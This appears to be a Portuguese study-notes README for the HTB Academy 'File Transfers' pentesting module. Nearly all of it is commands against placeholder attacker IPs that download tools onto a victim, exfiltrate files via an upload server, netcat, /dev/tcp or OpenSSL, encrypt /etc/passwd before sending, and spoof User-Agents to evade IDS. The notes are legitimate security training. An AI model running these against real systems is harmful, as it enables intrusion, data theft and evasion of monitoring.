# 🚀 Módulo HTB Academy: File Transfers

Este repositório documenta as técnicas aprendidas no módulo "File Transfers" da HTB Academy, focado em métodos para mover arquivos entre máquinas (download e upload) em um cenário de pentest.

## 1. Transferência com Código (Python, PHP, Perl)

Podemos usar linguagens de script comuns para baixar arquivos.

**Python 3 (Download):**

python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<IP_ATAQUE>/arquivo", "arquivo_local")'
PHP (Download):



php -r '$file = file_get_contents("http://<IP_ATAQUE>/arquivo"); file_put_contents("arquivo_local",$file);'
Perl (Download):


perl -e 'use LWP::Simple; getstore("http://<IP_ATAQUE>/arquivo", "arquivo_local");'
2. Servidor de Upload (Python)
Uma forma fácil de receber arquivos (exfiltração) é subir um servidor de upload temporário.



python3 -m uploadserver
# Servidor disponível em [http://0.0.0.0:8000/upload](http://0.0.0.0:8000/upload)
Na Máquina Vítima (Para enviar um arquivo):

Bash

python3 -c 'import requests;requests.post("http://<IP_PWNBOX>:8000/upload",files={"files":open("/caminho/do/arquivo","rb")})'
3. Métodos Diversos (Netcat, RDP)
Netcat (nc): Clássico para transferências simples.



nc -l -p 8000 > arquivo_recebido
No Pwnbox (Enviar):


nc -q 0 <IP_VITIMA> 8000 < arquivo_para_enviar
Bash Pseudo-device (Se nc não estiver disponível):

Na Máquina Vítima (Receber):

cat < /dev/tcp/<IP_PWNBOX>/443 > arquivo_recebido
No Pwnbox (Enviar):



sudo nc -l -p 443 -q 0 < arquivo_para_enviar
4. Living off the Land (LOLBAS & GTFOBins)
Usar binários nativos do sistema para evitar detecção.

LOLBAS (Windows)
Certutil:

DOS

C:\> certutil.exe -verifyctl -split -f http://<IP_ATAQUE>/arquivo.exe
Bitsadmin:

PowerShell

PS C_> bitsadmin /transfer n http://<IP_ATAQUE>/arquivo.exe C:\Temp\arquivo.exe
GTFOBins (Linux)
OpenSSL (Cliente/Servidor Criptografado):

No Pwnbox (Servidor):



openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /caminho/do/arquivo_para_enviar
Na Vítima (Cliente):



openssl s_client -connect <IP_PWNBOX>:80 -quiet > arquivo_recebido
5. Transferências Protegidas (Criptografia)
Para exfiltrar dados sensíveis (ex: NTDS.dit), é crucial criptografar antes de transferir.

OpenSSL (Linux):

Criptografar:



openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
Descriptografar:



openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
6. Evasão de Detecção (User-Agent)
Sistemas de detecção (IDS) monitoram "User-Agents". Ferramentas padrão (PowerShell, certutil) têm User-Agents conhecidos e suspeitos.

Podemos mascarar nosso download no PowerShell para parecer um navegador comum (Chrome):

PowerShell

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP_ATAQUE>/nc.exe -UserAgent $UserAgent -OutFile "nc.exe"
